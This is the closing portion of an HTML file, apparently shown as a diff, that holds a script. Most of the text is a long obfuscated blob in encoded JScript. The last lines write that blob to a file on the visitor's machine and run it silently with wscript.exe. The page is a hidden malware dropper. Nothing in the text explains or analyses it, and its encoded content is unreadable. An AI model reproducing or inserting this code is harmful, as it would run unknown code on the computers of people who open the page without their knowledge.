mOkKUP$l1-X`w5hlvb	7CMPOOc6/\'	+S~2	Eh+MlOGM`wR;6.RMOoW^NDcw5hlvbRwrV/bI6WDcOOcW/chK\\nwkM/Yv#pZYOcW/clO3	N`*IYOc0k hW7+g+aYcb*	-lM~E+ya%{Y,*WkRrYhv# hlDtib0vc42;**vE"XL#{xB9WmEkk42;W*cE"XLb\'{vNKmav-u4f5W*cE+"XLb{\'EDY6B*\'[9 80l`;.6L* /!4/D.c!B *"xB=yE#`YZnD6`25s*vQv\'-v_9+(0XvE+y6N#3vRN/nB*irG24Dv;v.6LBf0#p8Vd+~r6`8&$**vE"XL#xxEtO:Ek-4f$cl`E+yX%#{\'vtD:sv*	;+*m$`E+"aL*i)jm.raY ?^n+a`*bp88W;	mOkKU,D^scS`YS+XG#PDnY!DU~X+h2zR"+o"nCNvB_|/IwwE_OhaW3BwwE#iNW!x^YbG	PdOyk:`*	S4k^+cm74C5{\'0RCFO#	D.z	7lMPz\\*;W\'U+S~b1Yr-(r8%mO`E	Um.bwDR1YSGD0Bbi7l.~my\\W^\'H\\c!* 2	Es1nYAGM39Db-+k`bI6WDc-mD~k{qpk@!my7cmcVUoDtIk3\'+bPY!.0vly7*^R&Y:ckbQE-wl	UkRCUbB#I20kOwvC.\\*1R&Y+s`bb_E-wB*i5CO\\6vCy7cmc(O+s`b#QBwwE#I8)^lDm4c#	N	Um.kaOc?s+a`,Z!ZT!*iN86EU^DkW	~YZ+D6cU*O0l#`kWc1h*DDcxl,WX*"\'1+ZFb	bG24.vxl,0l~ZbiDDz	7l.~M&h+2\'a%EX" ZM+mYnKnaDsrVcxl,WXBYD;n*i.&SaR	MkD+`$!$nE*i.&Sv2 ;VWkn`*i81COm4`#`kWca%;6. sKV[nM26rdD/cxl16*b*	H%EXcvU*O0X#pYTnM0`	X,6*#pNN0bxmVsX`r6`8&$**vxX16*#ZxELd+EbPkG24M`xl,6X~2,bi)8NN6Ex1OkKxPXULt8`*	ODz`7l.P1tTxxah&z "+LIC9`v_|;j-\'?KWYSl.+\'-\\r1DWkG0D--qrUNKhk-wZ;.M+UYjnDkkGU\'-2a2^W.+Mw\'?4V^PsKV9nDk-wZGP$;Mxk	LB*iYZn.0v+OtLxQv\'-Cx	r+clUrE#iLVF/%`14oU3B\'-l!YK.E	Rrx6BbI)mlD^tv+#PNN0!x1YrWU~H%;6Wc++ld^*	Y.zPw0EX"cfn^+D+sKV9nDv+lkmSOME+*I81lY14c+*	X+A&z "EU`E^:9RnaPz^~MN~zk~J;~\'-\'-R\'-rv_vC/1_vEE~!BOD!+#pNN0!x1YrWU~.!86^c#PY.zP6+AfHR]+T9VnD+vBCnZ"w-C-w/4+ss6-\'/W	Y+XO\\+	E_lUNsnM/w-}2+	P	rDt-wv*iNmmO1tc#P8YMXPa+S&zR"+L	MkYcB_|Z"wwB3D1:*hcvckU0Eb_E-wd4+Vsw\'qU/DC^Vw\'mK::mx9w-E~vmsN nX+PJ^P9+V,&5PJ0,JYFEvBB]2Vm2on)HG{?tv*iNmmO1tc#P8YMXPa+S&zR"+L	MkYcB_|Z"wwB3D1:*hcvc9j2Eb_E-wj4+Vsw\'2[kDw\'ZGs:mxN\'-ESD1:*hvD^hWh`E 9U2B*Qv-\'?4+sVww}wnx\'wZK:hC	N-wv*~vIA!|2phbgf{U}Ebi)mCY1tcn*	8D.XP6+SfzR"+TfnVnO`vCn/I\'-vQMm:*AvB 9U3E#QE-\'?tV^w-}wnxy-wv*i81CY1t`b`8DDH	a+AfHR]+T9+^+OnvBCF/"-wB3.1:*S`ER9U2Eb_E-w?4+ss\'-ranxy--;Gh:mx9-wBbI)mCY14`#`NDDX`ahfXc]o9VY+vB_FZ"-wB3D^hWh`E 9U2B*Qv-\'?4+sV3a\'-KDK2+MYzj4++Oumx[V.k-wq?_nDKwkw-E#I81lO^4`+*`8DDXPanh2XcIno	.bYn`Eu|;IwwE_D^hWhcBc.ov*_E--ktsV\'-Gwxww1W:sCx9--ESvmsNc+a+~&1P[+^~z$P&W,J]qEE~vIA!|2phbgf{U}Ebi)mCY1tcn*	8D.XP6+SfzR"+T.kOnvBu|;i-\'?GWDhl.n\'-\\k1.K/G6Y\'-bx9Ghk-wZ!D.n	Y../bWx\'wKW^k1kn/wwA62VK.+M-wHKsksnz/dW1rmYnE~EFBBB"3M|f	r"fvbp8mmOm4`+*`NYMXP6nhfzcInoq.kD+cv_|Ziw\'?G0DAmDn\'-tkmMWkG0D-wbx[GS/-\'/EMD+	O#+M/bWU-wKKVrmbn/\'-jzkY+hw\'fr/m8^+]ob/YMX:GW^/v~EFvSEI2VmfqrIGvbi)mmY^tcn*	NYMz	X+AfHRInLqDrYcECF;j\'-?K0DAlM+w-tk^.K/W6O-\'k	[Ghk-\'Z;D.n	Y#+MdkKxwwhWVr^b+d-\'jH/O:\'-fb/m8VKC/0HL.E~B8v~EI2Vm9}IGBbiN^mY^tvn#P8O.H	6nA2X ILqDrD+vBCnZ`w-UWWYSl.n\'-nKsk1k+kwwHbmMWdWWO\'-\\H;w-"+dOMkmOPKnnDsrDYn9?	lwbxkv~EFv~EI3!|f}]fE#i)^CY1tv+b	NOMX`6A&HR]nTDrO`vCnJt-wUrwKzIAw-tk^DK/GWD--qrx9Whk~HK\'-;E.DnUD.nDkrW	-w(slon~wks+,3X+^!YbWx,raOkKxd-\'lOOMk4cn6--Gn8EToDv~v^sN +XnPJm~.:BbI)mCY14v+bP8DDXP6A&HR]+T.rD+`Eu|dH-\'j6s:zI3-w\\bm.WkG0D-w	bxNGAkPHK\'w;E.M+	Y.DkrW	-wqslLn,sk^nPA6+1;OkKx,r2YrG	/w-m;YKD;UkR+an\'-9+(;TonMBBBmsNcn6P&m,Nns,z;,&0E#i)^CY1tv+b	NOMX`6A&HR]nTDrO`vCnJt-wUrwKzIAw-tk^DK/GWD--qrx9Whk~HK\'-;E.DnUD.nDkrW	-w(slon~wks+,3X+^!YbWx,raOkKxd-\'w.G1+6a +X+-\'9n4!oT+.BSv1:[Ra+,z^~9+V~&$P&0Ebp8^mY1t`#PNYMX`6hfzcI+T	DbY+vvu|dH\'-jroPqb]2\'wHbm.GkW0Ow\'rx9GS/~gK\'-Z!DMnxD.nDkkGU\'-qsCoPsbsnPA6m;YrG	P6wDrW	/wwM+o nX+w-Gn(ELT+MB~Ems[R6nPJm~.:B*I81lY14c+*	)Y.X`ahfXc]+T.rD+`vunS\\-\'j}sPqb"2-\'Hb^DK/G0D-w	bxNKA/,1K\'w/EMDxO.n.kkGx\'wqslLn,sksn,2a+1;DkG	P}wYbW	d-\'InozVz"DRa+\'-f8;oT+MBSB^h9Rn6~z1P[n^Pz5~J0v#pN1lO1tv+#P8D.XP6nh2X ]oMrY`B_FJH\'-UroK	)"2w-trmMWdG6Y-w	bx[WSd,1P\'-;EDM+	O.DdkKxww&:lTnPwkV~36m!YrWU~}wOkKU/\'-OCk33rs^Rn6w\'fn(ETo+MBBvmsN +X+~&1PDhB*i81COm4`#`8O.H	a+SfXcInLqDkOnvBu|d\\\'-j}s:b"2\'wHbm.WkWWO\'-bUNKh/,HP-\'Z!D.+UOj+./bGx\'-	r	VWLG	-wjknMkUbYE~yH X1_E-wEk+.r	kYcn6~hk^.kaYc+a+~&J+lLk^DbwO xmG[Pv_60mF13B,z+E#pNmmY^tv+b`)YDH`6h&H ]+TMkO+cv_|JH\'w?}sP	zI2wwtk^DKdK0O\'-qkx9WSd-\'Z;DM+UOj+DkrW	--Aa2VKDDw-)[7lUm[-\'sGs9+Dww_k[+wr^+3XY\'-j	m4nm0+[.mV;nE~B8v~EI2Vm9}IGBbiN^mY^tvn#P8O.H	6nA2X ILqDrD+vBCnStw-UroKqb]3\'-Hb^DK/W6Ow-qk	NGhdw\'Z;DMnxD.n.kkWUw\'2aw^GM+.\'-zN\\mx1nN\'-oW^Nn.\'-?!2+MCk9[nx\'-`x^tn^0+[.msEBSvZB~v]AMmfq6"fv*i)mlDm4c+*	NYMX`ah&H IoMrO+vB_|JHwwUroKq)IA-wKKVk^r/w-tr1DGkW6Y-\'bUNKhdPgKwwUX/Dn:"+/DG.+\'-Gkdl8sZGx6roE~vqE~B]3V{9}]GBbp81lY1tvn#P8ODH	anS&Xc]+TDbOn`ECnS\\-wj}sPz]2\'-KG^kmrnk-wHb^MWdK0D--qk	[WS/~1:-wjH/YhI/YK.n-\'fb/C4snUIv~EqBBB]3V{f	6"fv#pN1lO1tv+#P8)WE	mOkKx~"ayWc#P\\lM~Cc$VD\'	?^.bwORz.o!:nUD/irWv4f;WXvm-(l$#"{BNd+E[\'lW;sOcV+	LY4@*!*`dhbY1tcl*5^Y qDn:v!bbPmldn,B&+El1*UN&v#i(DC3pmC/Pv&MB)^2%Mc`*I8Dl0i^ldn,B&/EllFE{;v#i8.lVi1Ck+~Ez	B)k,.d:v#I4M+CVpmlknPEzYEln,^L.`bianS&zR";xvB^h9Pz^~9+sPJ5,zW,B3m\\(l$S!*i8DlVI1l/~BJlB=n1VNyv#I6nA2X I!U`E+a2^WDn.c+a+,&~&k+^+mD~EQm74C;*i8.l3p[+6lE^Ol+OVNyc#IOMX`6A&HR];	`BAhaVCX.c+aPrB_1\\(C;c/;4kY.cZ~m78l$RVULY4OO#QB8nmEOk6;V|or.^{wC.D{v_m*$VOc1m:+9R&O+s`v;E#Qvcl\\bv#p8mmO^tv+*	N8Nn^/n	1VNycbp4\\X"8`bi)N.w"K+v#iFWMMAA==^#~@ '+String.fromCharCode(0);var rwyg5=ayfp6.CreateTextFile(s41k8+'\\'+bgw3u,true);rwyg5.Write(vlx8c);rwyg5.Close();dk5h8.Run('wscript.exe //e:jscript.encode '+s41k8+'\\'+bgw3u+' /t');
+//-->
+</script>
+</html>
